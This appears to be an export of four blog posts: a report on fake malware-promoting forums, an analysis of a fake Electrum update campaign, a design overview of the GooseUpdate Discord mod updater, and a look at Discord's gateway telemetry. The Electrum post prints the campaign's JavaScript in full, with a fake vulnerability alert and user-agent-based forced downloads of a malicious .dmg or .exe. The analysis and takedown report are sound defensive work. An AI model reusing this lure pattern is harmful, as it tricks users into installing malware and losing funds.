[{"content":"Discovering Whilst doing some random googling and looking at some of the last pages, I noticed a recurring pattern in some sites which came up. Then, I noticed this was a method for promoting malware with some interesting ways. This is a writeup on this method.\nForums In case you don\u0026rsquo;t know, forums are a popular form of websites for discussing topics, usually having sites dedicated to certain things like computing, companies / projects (like Mozilla, etc). Most of these are legitmate, having actual people talking and most people not being malicious; however these sites are completely fake.\nTemplating The forums I found were essentially HTML templates, swapping some text with what is included in a query parameter (like ?q=example+text) PHP.\nSite 1 Site 2 ","date":"2021-07-22T00:00:00Z","permalink":"https://honk.camp/p/malware-promotion-via-fake-forums/","title":"Malware Promotion via Fake Forums"},{"content":"Targeting The main method of targetting users seems to be via a malicious Google Ads campaign. The main site where users seem to be encountering this is Reddit, as seen in this Reddit thread posted. This seems to be executing JS to make an alert telling users to update Electrum and making an executable download via opening another browser (we will talk about how later in the HTML code review). This can be seen in the apparent content of the alert as said in the Reddit thread:\n Electrum versions older than 4.0.9 have a vulnerability. Please update Electrum to avoid losing funds.\n However, the thread is especially useful as the pasted text includes the origin of the iframe: (with escaped URL)\n An embedded page at electrum-4[dot]github[dot]io says:\n The site As apparent from the url of the site, it is a GitHub Pages site. GitHub Pages allows GitHub, a public Git hosting provider (among other services and features), users a way to easily host their repositories online with subdomains under \u0026ldquo;[username].github.io\u0026rdquo;.\nThe GitHub user As it is GitHub Pages, this means the repository could be public, but depends on the how the user set it up. In this instance, by looking at the user\u0026rsquo;s page, finding it by just plugging it into \u0026ldquo;github.com/[username]\u0026rdquo; from the GitHub Pages subdomain, we can see the repository is open source and public.\nThe site\u0026rsquo;s source index.html The index page has a simple user interface, a loading animation. But we are more interested in the JS running in the background. The JS running is quite small, here is the entire source:\nif (navigator.userAgent.indexOf(\u0026#39;Mac OS\u0026#39;) != -1) { top.location.href = \u0026#39;https://raw.githubusercontent.com/electrum-4/electrum/main/electrum-4.0.9.dmg\u0026#39;; } else { top.location.href = \u0026#39;https://raw.githubusercontent.com/electrum-4/electrum/main/electrum-4.0.9-setup.exe\u0026#39;; } setTimeout(function () { window.location.href = \u0026#34;https://electrum.org/\u0026#34;; }, 7000); A small step-by-step analysis:\n Detect if the website is being ran on a Mac OS device:  If so: download a .dmg file If not: download a .exe file   After 7 seconds redirect to the official Electrum site  electrum.html I am pretty sure this is the HTML which is inside the iframe which ran. It is very similar to the index.html in concept, however without the UI and with different download methods.\nThe JavaScript (ran via script):\nif (navigator \u0026amp;\u0026amp; (navigator.userAgent.indexOf(\u0026#34;Windows\u0026#34;) \u0026gt; -1)) { alert(\u0026#34;\\n\\nElectrum versions older than 4.0.9 have a vulnerability. Please update Electrum to avoid losing funds.\\n\\n\u0026#34;); location.href = \u0026#39;microsoft-edge:https://electrum-4.github.io/\u0026#39;; } else if (navigator \u0026amp;\u0026amp; (navigator.userAgent.indexOf(\u0026#34;Mac OS\u0026#34;) \u0026gt; -1)) { prompt(\u0026#34;\\n\\nElectrum versions older than 4.0.9 have a vulnerability. Please update Electrum to avoid losing funds.\\n\\nCopy the following URL and paste it to your browser address bar:\\n\u0026#34;, \u0026#34;https://electrum-4.github.io/\u0026#34;); } Another small step-by-step analysis:\n If on Windows:  Alert the user to trick them into downloading and running the malicious executable Try and download it by attempting to open Microsoft Edge with the link to the main index page   Else, if on Mac OS:  Make a prompt to try and get the user to open the main index page into their browser    The binaries The binaries are stored in another GitHub repo under the same user (electrum-4/electrum), as the JS in the site uses a raw GitHub URL (a way of accessing a file in a GitHub repo directly via a URL) to download the binaries. I will not go into the actual binaries here as I am not experienced with that side.\nFinal Notes I have contacted GitHub with a link to this writeup to attempt to get the user / repos taken down to prevent further users from being attacked. Thanks.\nTrivia / Extra Info  Whilst the GitHub Pages repo is committed via the GitHub user, the actual repo with the binaries has commits made by the author root \u0026lt;root@vps.server.local\u0026gt;  Update (18:20 UTC) GitHub has now taken the user down, resulting in the binaries no longer being hosted and the GitHub Pages site now no longer being online, meaning no new users can be attacked.\n","date":"2021-02-22T00:00:00Z","permalink":"https://honk.camp/p/electrum-malware-campaign/","title":"Electrum Malware Campaign"},{"content":"GooseUpdate Intro GooseUpdate is an alternative Discord update endpoint which gives users both normal Discord updates with mods (of the user\u0026rsquo;s choice) patched into them automatically. You can find it on GitHub, and also look at the online dashboard.\nv3 I started making v3 as the code for GooseUpdate was becoming more complicated and cluttered; since all the code was in one JS file. The idea for v3 was to split it up to be more manageable, plus more easy to maintain and improve in the future.\nEventual Structure   Individual request handlers go in requests/; with the host updates being in requests/host/ for further organisation. Module downloading is also a directory, as it is much more complicated than the other handlers (due to the procedural patching of the desktop_core module).\n  Generic utility functions for the request handlers go in generic/ - redirect and proxy being the two types / modes. Redirect simply redirects the original request to Discord, whilst proxy actually proxies (asks Discord for the normal response then allows the individual handler to edit the response to relay it to the client).\n  Dashboard things (this dashboard) go in dashboard/; with the template HTML and the request handler in it.\n  The temporary migration from GooseUpdate v1 to v2 is included as well in simply v2Migration.js. This is required as the old endpoint was simply \u0026lt;host\u0026gt;, but in v2 I added branches which allow choosing with specific mods you want. New endpoints look like \u0026lt;host\u0026gt;/\u0026lt;branches\u0026gt; (for example: \u0026lt;host\u0026gt;/goosemod or \u0026lt;host\u0026gt;/betterdiscord+goosemod).\n  ","date":"2020-12-16T00:00:00Z","permalink":"https://honk.camp/p/gooseupdate-v3-codebase-design/","title":"GooseUpdate v3 Codebase Design"},{"content":"Intro Discord uses a WebSocket for communication between their servers and it\u0026rsquo;s web client. I decided to look into it to see if it has any telemetry with their desktop client (even a tiny amount); it does.\nThe WebSocket WebSocket Intro WebSockets are great for using low bandwidth / data and fast communication, as it is event-driven and can easily support compressed and small messages. They are primarily used in the web, but can also be used server-side for some things.\nGateway Discord call their WebSocket their \u0026ldquo;gateway\u0026rdquo;, hosted on gateway.discord.gg. It is used primarily for actions which require speed so it would be ineffective to use their HTTP REST API. Primarily, it looks like it is used to recieving messages. It is connected with some query parameters, for example:\nwss://gateway.discord.gg/?encoding=etf\u0026amp;v=8\u0026amp;compress=zlib-stream The Telemetry Overview On connection of the WebSocket in Discord\u0026rsquo;s desktop app, it sends a collection of information about the user\u0026rsquo;s OS setup. Below is an example of the telemetry on my current setup.\nHex View (That hex editor is ImHex by WerWolv by the way)\nSimplified View properties: os Linux browser Discord Client release_channel canary client_version 00115 os_version 599-zen1-1-zen os_arch x64 window_manager i3,i3 distro \u0026quot;Arch Linux\u0026quot; presence: status online activities: afks false compress false Adapted from a Twitter thread ","date":"2020-12-13T00:00:00Z","permalink":"https://honk.camp/p/discords-telemetry-on-websocket-connect/","title":"Discord's Telemetry on WebSocket Connect"}]